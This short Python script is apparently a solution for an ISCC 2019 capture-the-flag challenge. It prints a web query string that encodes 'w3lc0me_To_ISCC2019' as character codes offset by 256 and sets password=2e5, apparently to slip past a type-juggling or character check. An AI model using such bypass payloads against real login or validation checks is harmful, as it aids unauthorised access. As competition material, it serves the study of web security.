#!/usr/bin/env python
# coding=utf-8

# @file payload.py
# @brief payload
# @author Anemone95,x565178035@126.com
# @version 1.0
# @date 2019-05-02 12:16

def payload():
    s='w3lc0me_To_ISCC2019'
    value="?"
    for idx in range(len(s)):
        value+="value[{idx}]={value}&".format(idx=idx, value=256+ord(s[idx]))
    value+="password=2e5"
    print(value)

if __name__ == '__main__':
    payload()

